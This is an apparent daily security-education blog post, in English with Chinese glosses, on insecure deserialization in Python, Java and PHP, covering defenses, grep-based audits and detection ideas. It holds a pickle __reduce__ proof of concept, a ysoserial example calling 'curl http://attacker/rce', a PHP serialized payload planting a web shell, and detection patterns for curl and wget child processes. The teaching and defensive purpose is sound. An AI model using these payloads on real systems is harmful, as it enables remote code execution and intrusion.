---
title: "Day 28 — Insecure Deserialization: When Trusting Data Becomes RCE"
date: 2026-09-11
tags:
  - daily
  - security
  - english
description: "In 2017, Equifax （美国征信巨头 Equifax） disclosed a breach that exposed the personal data of 147 million consumers. The root cause was a vulnerability in Ap"
---

**Date:** 2026-09-11 | **Difficulty:** ★★★☆☆ Technical | **Source:** OWASP A08:2021 / PortSwigger Web Security Academy / SANS | **Link:** [OWASP — Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data), [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization), [SANS — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

## Why This Matters

In 2017, **Equifax** （美国征信巨头 Equifax） disclosed a breach that exposed the personal data of 147 million consumers. The root cause was a vulnerability in **Apache Struts 2** — specifically, an unsafe deserialization flaw. In 2019, a similar class of bug in **FasterXML Jackson** （Java JSON 库） let attackers achieve **Remote Code Execution** （远程代码执行, RCE） on thousands of servers. The pattern repeats every year: a framework trusts a serialized blob, the blob contains a crafted object graph, and the framework's own code calls a dangerous method on that graph during reconstruction.

**Insecure Deserialization** （不安全反序列化） is the textbook example of a vulnerability that scanners struggle to find and defenders struggle to remediate. It hides in legitimate-looking traffic, often looks like a normal API call, and on the right target gives the attacker the same shell as a SQL injection from a decade ago.

> 不安全反序列化让"数据"伪装成"代码"——开发者只看到 JSON 字段，攻击者看到的是任意对象图。

---

## What Is Serialization, Anyway?

To understand the bug, you first need the basic operation that triggers it. Most programs need to send in-memory objects across the network or store them on disk. That conversion has two halves:

| Term | Meaning |
|------|---------|
| **Serialization** （序列化） | Convert an in-memory object into a format that can be stored or transmitted — a byte stream, a JSON string, an XML blob, a Base64 string. |
| **Deserialization** （反序列化） | The reverse — take that external representation and rebuild the original object in memory. |

For a typical web session, the flow looks like this:

```
[Server Object]  --serialize-->  {"user":"alice","role":"admin"}
                                          ↓ (cookie / POST body / Redis / JWT payload)
[Client]       --deserialize-->  [Server Object rebuilt]
```

The danger is the word **"rebuild"** （重建）. A naive deserializer doesn't just copy fields — it instantiates classes, calls constructors, and may invoke **magic methods** （魔术方法） or **callbacks** as part of object construction. If the attacker controls the serialized blob, they control which classes get instantiated and which methods get called.

---

## The Core Trust Assumption

Every vulnerable application makes the same flawed assumption:

> *"If data is properly formatted, signed, or stored internally, it must be safe to deserialize."*

That assumption breaks for three reasons:

1. **Attacker controls the blob.** Cookies, POST bodies, JWT payloads, Redis cache entries, message queues, and database blobs are all places an attacker can plant a serialized object.
2. **Deserializers are too powerful.** Languages expose deserializers as universal object constructors — they accept **any class** available on the classpath, not just the one the developer expected.
3. **Magic methods run during construction.** Methods like Java's `readObject`, Python's `__reduce__`, or PHP's `__wakeup` execute code **before** the developer ever sees the data.

The result is **Remote Code Execution** with no buffer overflow, no SQL syntax, no shell metacharacter — just data that the server happily turns into an in-memory attack program.

---

## The Language Landscape

Almost every mainstream language ships at least one dangerous native deserializer. The table below is the cheat sheet you should memorize.

| Language | Dangerous API | Trigger Method | RCE Gadget? |
|----------|---------------|----------------|-------------|
| **Python** | `pickle.loads`, `pickle.load`, `cPickle.loads` | `__reduce__` | Yes — direct |
| **Java** | `ObjectInputStream.readObject` | `readObject`, `readResolve` | Yes — via gadget chains (`ysoserial`) |
| **PHP** | `unserialize()` | `__wakeup`, `__destruct` | Yes — via POP gadgets |
| **Node.js** | `node-serialize`, `serialize-javascript` (with `eval`) | `unserialize` | Yes — via `eval` |
| **.NET** | `BinaryFormatter.Deserialize`, `LosFormatter.Deserialize`, `JavaScriptSerializer` (with `SimpleTypeResolver`) | Constructor, setters | Yes — via `TypeConfuseDelegate` |
| **Ruby** | `Marshal.load`, `Oj` (in compatibility mode) | Singleton methods | Yes — via `ERB` |
| **Go** | `gob.NewDecoder().Decode` (rarely exploitable) | Limited | Mostly DoS |

> 凡是"`loads` 一个用户能控制的字符串就能直接执行任意命令"的 API,就是反序列化漏洞的源头。

---

## Python: Pickle Is Not a Data Format

Python's `pickle` is the cleanest illustration. The official Python documentation warns explicitly: *"Pickle is unsafe by design."* The reason is the `__reduce__` method, which tells the deserializer how to reconstruct an object — including which **function to call and with what arguments** （要调用哪个函数,传入什么参数）.

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ returns a callable + arguments
        # pickle will literally call: os.system("whoami")
        return (os.system, ("whoami",))

payload = pickle.dumps(Exploit())          # serialize the exploit
# >>> b'\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00...\x8c\x06whoami\x85\x94.'

# Victim server
import pickle
pickle.loads(payload)                     # RCE — no eval, no sh, no SQL
```

A web app that does something as innocent as *"remember the user's theme choice in a signed cookie"* using `pickle` is one curl request away from shell.

### Safe Python Pattern

```python
import json
# BAD:  user_data = pickle.loads(request.cookies.get("session"))
# GOOD:
user_data = json.loads(request.cookies.get("session", "{}"))
```

JSON has no concept of classes, no `__reduce__`, no callable references. It is a **data format, not an object format** （数据格式,而不是对象格式）. That property alone makes it safer.

---

## Java: ysoserial and the Gadget Chain

Java's `ObjectInputStream` is the most-exploited deserializer in production. The attack flow is more subtle than Python because the attacker doesn't write the dangerous class — they reuse **libraries already on the victim's classpath** （受害服务器已加载的库） to build a chain of calls that ends in command execution. The canonical PoC tool is **`ysoserial`** （Java 反序列化利用工具）.

```
ysoserial.jar CommonsCollections5 "curl http://attacker/rce" | base64
                              ↓ (plant in any Java-deserialized field)
                       Tomcat / Jenkins / WebLogic / JBoss
                              ↓ (readObject fires)
                          command executed
```

Gadget chains exploit libraries like Apache Commons Collections, Spring, Groovy, ROME, and dozens more. The fact that they exist in production libraries is what makes Java deserialization uniquely dangerous — even if your own code never calls `readObject`, a vulnerable framework underneath you almost certainly does.

### The Modern Java Defense

```java
// BAD:  ObjectInputStream ois = new ObjectInputStream(in);
//       Object o = ois.readObject();

// GOOD: use a whitelist filter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;java.lang.Number;java.lang.String;!*"
);

try (ObjectInputStream ois = new ObjectInputStream(in)) {
    ois.setObjectInputFilter(filter);
    Object o = ois.readObject();
}
```

Since **JEP 415** （Java 18, 2022）, `ObjectInputFilter` is the official mechanism. Production servers should **always** set a class-allowlist before deserializing any external stream.

---

## PHP: `unserialize()` and POP Gadgets

PHP's `unserialize()` rebuilds PHP objects — including calling their **`__wakeup()`** （反序列化时触发的魔术方法） and **`__destruct()`** （对象销毁时触发的魔术方法） methods. The attack pattern is called a **POP chain** （Property-Oriented Programming gadget 链） — the attacker crafts an object graph whose properties trigger a chain of method calls that ends in `system`, `exec`, or `file_put_contents`.

```php
// VULNERABLE
class Cache {
    public function __destruct() {
        file_put_contents($this->logfile, $this->data);
    }
}
// Attacker plants: O:5:"Cache":2:{s:7:"logfile";s:9:"/tmp/x.php";s:4:"data";s:30:"<?php system($_GET['c']); ?>";}
unserialize($_COOKIE['cache']);   // -> /tmp/x.php created
```

### The Two Simple PHP Defenses

```php
// 1. Use JSON instead — it has no class concept.
$data = json_decode($_COOKIE['cache'], true);

// 2. If you must use serialize, disable class instantiation:
$data = unserialize($blob, ['allowed_classes' => false]);
```

`allowed_classes => false` is the single most useful flag in modern PHP. It tells the deserializer *"only rebuild stdClass — never instantiate any user class."*

---

## Real-World Incidents Worth Remembering

| Year | Target | Cause |
|------|--------|-------|
| 2017 | **Equifax** | Apache Struts 2 deserialization flaw → 147 M records exposed. |
| 2019 | **FasterXML Jackson** | Polymorphic deserialization → RCE on thousands of servers. |
| 2021 | **VMware vCenter** | Java deserialization via SOAP → RCE on enterprise virtualisation. |
| 2022 | **Confluence** (Atlassian) | OGNL injection during deserialization of user-supplied objects. |

> These are not exotic bugs — they are the same pattern repeating across vendors.

---

## A Defense Checklist You Can Actually Use

Layered defenses, because a single control always fails somewhere:

| Layer | Control | What It Buys You |
|-------|---------|------------------|
| **Data format** | Replace `pickle`/`ObjectInputStream`/`unserialize` with **JSON, Protocol Buffers, or MessagePack** （结构化数据格式） | Eliminates 95 % of the risk. |
| **Integrity** | **HMAC sign** （HMAC 签名） every serialized blob before storing or transmitting | Stops tamper-by-attacker; stops class substitution. |
| **Type filter** | Set an **allowlist of classes** （类白名单） the deserializer may instantiate (JEP 415, `allowed_classes => false`, custom Python hook) | Stops unknown gadget chains. |
| **Isolation** | Run the deserializer in a **low-privilege sandboxed process** （沙箱进程） or container with seccomp / AppArmor | Limits blast radius if RCE fires. |
| **Detection** | Watch for unusual child processes: `java → /bin/sh`, `python → curl`, `php → wget` | Catches post-exploitation activity. |
| **Logging** | Record every `readObject` / `pickle.loads` / `unserialize` invocation with input size and source IP | Forensics when an incident happens. |

> 最务实的一招:**别用 pickle,别用 ObjectInputStream,别用 unserialize 解析用户输入**。JSON + HMAC 签名能解决 95% 的场景。

---

## A 1-Minute Triage for Your Own Codebase

If you are auditing a codebase today, run these greps — they catch the low-hanging fruit in seconds.

```bash
# Python
grep -rn "pickle\.loads\|pickle\.load\|cPickle\.loads\|shelve\.open\|yaml\.load(" --include="*.py" .

# Java
grep -rn "ObjectInputStream\|XMLDecoder\|XStream\|SnakeYaml\|Yaml\.load" --include="*.java" .

# PHP
grep -rn "unserialize\(\$_" --include="*.php" .

# Node.js
grep -rn "node-serialize\|serialize-javascript\|funcster" --include="*.js" .
```

Any hit on **user-controllable input** （用户可控输入） is at minimum a High severity finding. Any hit on internal-only data is still worth a code review, but lower priority.

---

## Key Terms

| English | 中文 | Note |
|---------|------|------|
| Serialization | 序列化 | 对象 → 字节流/字符串 |
| Deserialization | 反序列化 | 字节流/字符串 → 对象 |
| RCE (Remote Code Execution) | 远程代码执行 | 攻击者在受害服务器上执行任意命令 |
| Gadget chain | 调用链武器 | 复用合法库类拼凑成的命令执行链 |
| POP chain (Property-Oriented Programming) | 属性链 | PHP 反序列化利用模式 |
| `__reduce__` | Python 魔术方法 | pickle 反序列化时调用,指定"用什么函数+参数"重建对象 |
| `__wakeup` / `__destruct` | PHP 魔术方法 | 反序列化时/对象销毁时自动调用 |
| Magic methods | 魔术方法 | 语言在对象生命周期自动调用的钩子 |
| `ysoserial` | ysoserial 工具 | Java 反序列化 PoC 工具,封装多种 gadget 链 |
| `ObjectInputFilter` | Java 对象过滤器 | JEP 415 引入的类白名单机制 |
| HMAC | 基于哈希的消息认证码 | 给序列化数据加完整性签名 |
| Allowlist | 白名单 | 仅允许已知安全的类参与反序列化 |
| JSON | JavaScript 对象表示法 | 安全的数据交换格式,无类概念 |
| Protocol Buffers | Google 数据序列化协议 | 强类型、高性能、安全的二进制格式 |
| Sandbox | 沙箱 | 隔离的执行环境,限制爆炸半径 |
| Classpath | 类路径 | JVM 加载类的搜索路径,决定 gadget 链能否利用 |
| Data format vs Object format | 数据格式 vs 对象格式 | JSON 是数据,pickle 是对象 |

---

## 甲方视角思考

- **API 网关侧的字段白名单**：让 WAF/IPS 在反序列化流量源头标记异常 `Content-Type`（`application/x-java-serialized-object`、`application/x-pickle`），便于溯源。
- **影子资产排查**：很多老系统藏在角落仍在使用 `ObjectInputStream`、`pickle.loads`，季度巡检务必覆盖第三方 JAR 包与历史 PHP 代码。
- **RCE 是终点但不是起点**：检测侧重点应在反序列化触发后的子进程派生（`java → sh`、`python → curl`），EDR/SIEM 规则要覆盖。
- **供应链不可忽视**：Struts、Jackson、Fastjson、SnakeYAML 这类库的漏洞通告必须建立 SLA，72h 内完成版本核查。

---

## Tomorrow — Day 29 Preview

> **JWT Attacks: When Your "Stateless" Token Is Anything But**
>
> Tomorrow we will look at how JSON Web Tokens （JWT） — the most popular authentication mechanism on modern web APIs — break in the wild. Topics: `alg: none` confusion, weak HMAC secrets brute-forced by `hashcat`, **key confusion** （密钥混淆） between HS256 and RS256, JWK / JKU injection, and the famous `kid` parameter path-traversal flaw. Special focus on SSO-style authentication flows and how to defend them.
>
> 难度：★★★☆☆ Technical。
